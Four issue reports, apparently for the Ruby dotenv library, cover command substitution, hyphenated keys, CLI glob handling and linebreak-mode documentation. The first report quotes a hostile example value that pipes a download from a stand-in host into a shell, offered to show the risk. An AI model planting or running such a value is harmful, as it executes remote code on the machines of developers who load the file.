title: Command substitution executes arbitrary shell commands from .env files
body: Dotenv::Substitutions::Command evaluates anything matching `$(...)` with backticks, so a value like `FOO=$(curl evil.sh | sh)` runs on every `Dotenv.load`. We pull .env files from a shared config repo and would like a way to disable command substitution entirely rather than trusting every contributor's env file.

title: Parser rejects hyphenated keys like MY-VAR
body: The LINE regex in Parser only matches keys against `[\w.]+`, so a line like `MY-VAR=value` fails to parse as a key/value pair at all (it's silently dropped rather than raising). Some of our legacy .env files use hyphens and now those variables just never load.

title: CLI -f option doesn't accept glob patterns
body: `dotenv -f .env,.env.local` works fine with an explicit comma list, but `dotenv -f '.env*'` just tries to open a literal file named '.env*' instead of expanding it. Would be nice if CLI#initialize expanded globs before passing filenames to Dotenv.load.

title: Unclear what DOTENV_LINEBREAK_MODE=legacy actually changes
body: expand_newlines() branches on DOTENV_LINEBREAK_MODE being 'legacy' vs anything else, but I can't find documentation explaining what the non-legacy escaping (`\\\n`) is for or when I'd want to opt into the legacy behavior. A short explanation in the parser or README would help.
